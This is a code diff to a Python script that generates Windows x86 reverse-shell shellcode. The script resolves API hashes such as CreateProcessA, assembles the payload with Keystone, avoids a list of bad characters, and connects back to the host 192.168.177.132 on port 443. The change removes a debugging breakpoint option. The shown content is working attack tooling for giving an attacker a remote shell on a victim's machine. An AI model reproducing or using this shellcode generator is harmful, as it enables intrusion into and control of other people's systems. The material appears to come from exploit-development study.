@@ -38,7 +38,7 @@ def push_function_hash(function_name):
         ror_count += 1
     return ("    push " + hex(edx)+"                 ;")
 
-def rev_shellcode(rev_ip_addr, rev_port, breakpoint = 0, badchars=b""):
+def rev_shellcode(rev_ip_addr, rev_port, badchars=b""):
     push_instr_terminate_hash = push_function_hash("TerminateProcess")
     push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
     push_instr_createprocessa_hash = push_function_hash("CreateProcessA")
@@ -48,7 +48,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint = 0, badchars=b""):
 
     asm = [
         "start:                               ",
-        f"{['', '    int3                            ;'][breakpoint]}",  # insert break point
+        #"    int3                            ;",# insert break point
         "    mov ebp, esp                    ;",  #
         "    add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
         "find_kernel32:                       ",
@@ -264,7 +264,7 @@ def main():
     badchars = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
 
 
-    shellcode = rev_shellcode("192.168.177.132", 443, 1, badchars)
+    shellcode = rev_shellcode("192.168.177.132", 443, badchars)
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     encoding, count = eng.asm(shellcode)
 
